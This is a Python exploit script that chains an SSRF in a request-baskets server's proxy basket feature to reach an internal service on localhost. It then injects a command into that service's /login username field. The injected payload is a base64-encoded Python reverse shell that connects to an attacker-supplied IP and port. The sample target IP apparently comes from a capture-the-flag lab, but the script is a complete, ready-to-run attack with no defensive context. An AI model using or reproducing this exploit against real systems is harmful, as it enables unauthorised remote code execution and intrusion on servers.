#!/usr/bin/env python3
import requests
import sys
import random
import string
import base64
import time

def ensure_http_schema(url):
    if not url.startswith(("http://", "https://")):
        return "http://" + url
    return url

def generate_basket_name(length=6):
    return ''.join(random.choices(string.ascii_lowercase, k=length))

def create_proxy_basket(server_url, forward_url):
    if not server_url.endswith("/"):
        server_url += "/"

    basket_name = generate_basket_name()
    api_url = f"{server_url}api/baskets/{basket_name}"

    payload = {
        "forward_url": forward_url,
        "proxy_response": True,
        "insecure_tls": False,
        "expand_path": True,
        "capacity": 250
    }

    print(f"[+] Creating proxy basket '{basket_name}' pointing to {forward_url}")
    r = requests.post(api_url, json=payload)
    if r.status_code not in [200, 201]:
        print(f"[!] Failed to create basket: {r.status_code} {r.text}")
        sys.exit(1)

    token = r.json().get("token")
    basket_url = f"{server_url}{basket_name}"
    print(f"[+] Basket created: {basket_url}")
    print(f"[+] Authorization Token: {token}")
    return basket_url

def send_reverse_shell(proxy_url, attacker_ip, attacker_port):
    print("[+] Encoding reverse shell payload...")

    payload = f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{attacker_ip}",{attacker_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("sh")'"""
    b64_payload = base64.b64encode(payload.encode()).decode()

    injected_payload = f'`echo {b64_payload} | base64 -d | bash`'

    print("[+] Sending command injection via proxy to /login...")
    response = requests.post(f"{proxy_url}/login", data={"username": f";{injected_payload}"})

    if response.status_code in [200, 302]:
        print("[+] Exploit sent successfully! Check your listener.")
    else:
        print(f"[!] Exploit may have failed. HTTP {response.status_code}: {response.text}")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <attacker_ip> <attacker_port> <request_baskets_url>")
        print(f"Example: {sys.argv[0]} 10.10.10.10 8000 http://10.129.229.26:55555")
        sys.exit(1)

    attacker_ip = sys.argv[1]
    attacker_port = int(sys.argv[2])
    request_baskets_url = ensure_http_schema(sys.argv[3])
    proxy_target_url = "http://127.0.0.1:80"
    proxy_url = create_proxy_basket(request_baskets_url, proxy_target_url)
    time.sleep(3)
    send_reverse_shell(proxy_url, attacker_ip, attacker_port)
